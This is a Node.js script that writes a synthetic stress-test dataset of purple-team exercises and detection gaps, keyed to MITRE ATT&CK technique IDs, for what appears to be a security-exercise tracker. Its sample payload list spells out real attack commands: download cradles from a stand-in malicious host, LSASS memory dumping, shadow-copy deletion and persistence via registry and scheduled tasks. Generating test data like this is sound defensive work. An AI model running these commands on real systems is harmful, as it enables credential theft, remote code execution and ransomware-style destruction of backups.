const fs = require('fs');
const path = require('path');

const ttps = [
    "T1566", "T1566.001", "T1566.002", "T1190", "T1133",
    "T1059", "T1059.001", "T1059.003", "T1059.004", "T1053.005", "T1204.002",
    "T1543.003", "T1098", "T1068", "T1548.002", "T1562.001", "T1070.004",
    "T1003.001", "T1110.001", "T1087.001", "T1082", "T1021.001", "T1021.002",
    "T1114.002", "T1005", "T1071.001", "T1090.001", "T1048.002", "T1486", "T1490"
];

const statuses = ['high', 'medium', 'minimal', 'low', 'na', 'error', 'pending'];
const environments = ["Linux", "Windows Server", "Windows Workstation", "macOS", "Azure / Entra ID"];
const severities = ['Critical', 'High', 'Medium', 'Low'];
const gapStatuses = ['Open', 'In Progress', 'Resolved', 'Risk Accepted'];

const exercises = [];
const gaps = [];

// Helper to get random item
function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const redTeamNotes = [
    "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
    "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
    "Ran BloodHound ingestor (SharpHound.exe) from compromised endpoint. Mapped full AD domain.",
    "Executed PowerShell download cradle to pull secondary payload. Payload failed to execute due to execution policy.",
    "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
    "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
    "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
    "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
    "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
    "Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp."
];

const blueTeamNotes = [
    "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
    "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
    "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
    "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
    "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
    "Windows Defender flagged the file as malicious and quarantined it immediately.",
    "Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule.",
    "Activity completely bypassed EDR. No telemetry available on the endpoint.",
    "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
    "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise."
];

const payloadCodes = [
    "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
    "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
    "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
    "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe",
    "vssadmin.exe Delete Shadows /All /Quiet",
    "wmic process call create \"cmd.exe /c calc.exe\"",
    "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
    "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
    "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe"
];

// Helper to generate a random environment array
function randomEnvs() {
    const num = Math.floor(Math.random() * 2) + 1; // 1 or 2 environments
    const res = [];
    while (res.length < num) {
        const env = randomChoice(environments);
        if (!res.includes(env)) {
            res.push(env);
        }
    }
    return res;
}

// Generate at least 10,000 exercises
const numExercises = 10500;
for (let i = 0; i < numExercises; i++) {
    const ttp = randomChoice(ttps);
    const status = randomChoice(statuses);
    const dateChoice = Math.random();
    let dateStr;
    if (dateChoice < 0.02) {
        dateStr = "";
    } else if (dateChoice < 0.04) {
        dateStr = null;
    } else if (dateChoice < 0.06) {
        dateStr = "invalid-date";
    } else {
        const d = new Date(Date.now() - Math.floor(Math.random() * 100 * 24 * 3600 * 1000));
        dateStr = d.toISOString();
    }

    exercises.push({
        id: String(1700000000000 + i),
        ttp: ttp,
        campaign: `Stress Campaign ${i % 20 + 1}`,
        finding: `Event: Simulated attack procedure [${status}]\n\nExecution: ${randomChoice(redTeamNotes)}\n\nDetection: ${randomChoice(blueTeamNotes)}`,
        remediation: `Event: Simulated attack procedure [${status}]\n\nExecution: ${randomChoice(redTeamNotes)}\n\nDetection: ${randomChoice(blueTeamNotes)}`,
        status: status,
        environment: randomEnvs(),
        date: dateStr,
        testResults: [{
            payloadCode: randomChoice(payloadCodes),
            procedureSteps: "Step 1: Execute payload\nStep 2: Check C2 connection\nStep 3: Cleanup"
        }]
    });
}

// Generate at least 1,000 gaps
const numGaps = 1050;
for (let i = 0; i < numGaps; i++) {
    const ttp = randomChoice(ttps);
    const status = randomChoice(gapStatuses);
    const severity = randomChoice(severities);
    
    let priorityScore = 20;
    if (severity === 'Critical') priorityScore = 100;
    else if (severity === 'High') priorityScore = 80;
    else if (severity === 'Medium') priorityScore = 50;

    // Generate dates
    const createdDateRaw = new Date(Date.now() - Math.floor(Math.random() * 60 * 24 * 3600 * 1000) - 30 * 24 * 3600 * 1000);
    const createdDateStr = createdDateRaw.toISOString();

    let resolvedDateStr = null;
    if (status === 'Resolved') {
        const dateChoice = Math.random();
        if (dateChoice < 0.1) {
            // Out of sync dates (resolved before created)
            const resolvedDateRaw = new Date(createdDateRaw.getTime() - Math.floor(Math.random() * 5 * 24 * 3600 * 1000) - 1000);
            resolvedDateStr = resolvedDateRaw.toISOString();
        } else if (dateChoice < 0.15) {
            // Invalid date
            resolvedDateStr = "invalid-resolved-date";
        } else if (dateChoice < 0.2) {
            // Out of sync / invalid date mix
            resolvedDateStr = "2026-99-99";
        } else {
            // Normal staggered resolved date after createdDate
            const resolvedDateRaw = new Date(createdDateRaw.getTime() + Math.floor(Math.random() * 20 * 24 * 3600 * 1000) + 1000);
            resolvedDateStr = resolvedDateRaw.toISOString();
        }
    }

    gaps.push({
        id: String(1800000000000 + i),
        ttp: ttp,
        campaign: `Stress Campaign ${i % 20 + 1}`,
        finding: `Simulated attack procedure for ${ttp}`,
        details: `Execution: ${randomChoice(redTeamNotes)}\nDetection: ${randomChoice(blueTeamNotes)}`,
        severity: severity,
        priorityScore: priorityScore,
        status: status,
        actionItems: "Implement detection rules.",
        stakeholders: ["Detection Engineering"],
        environment: randomEnvs(),
        createdDate: createdDateStr,
        resolvedDate: resolvedDateStr
    });
}

// Generate campaign summaries dynamically
const campaignSummaries = {};
for (let i = 1; i <= 20; i++) {
    const campName = `Stress Campaign ${i}`;
    campaignSummaries[campName] = {
        summary: `## Executive Summary for ${campName}\nThis is a stress test summary for ${campName}.`,
        details: {
            name: campName,
            environmentCategory: ["Linux", "Windows Server"],
            environment: "Mixed",
            goals: "Test system metrics resilience under high volume",
            participants: [
                { id: 1, name: "Stress Agent", role: "Purple Team" }
            ]
        },
        attackChain: "Simulated Attack Chain text",
        testResults: [],
        timestamp: new Date().toISOString()
    };
}

const output = {
    exercises,
    gaps,
    campaignSummaries,
    campaignEvidence: {}
};

const outputPath = path.resolve(__dirname, 'synthetic_stress_data.json');
fs.writeFileSync(outputPath, JSON.stringify(output, null, 2));
console.log(`Successfully generated massive synthetic stress dataset at ${outputPath}`);
console.log(`Generated ${exercises.length} exercises and ${gaps.length} gaps.`);
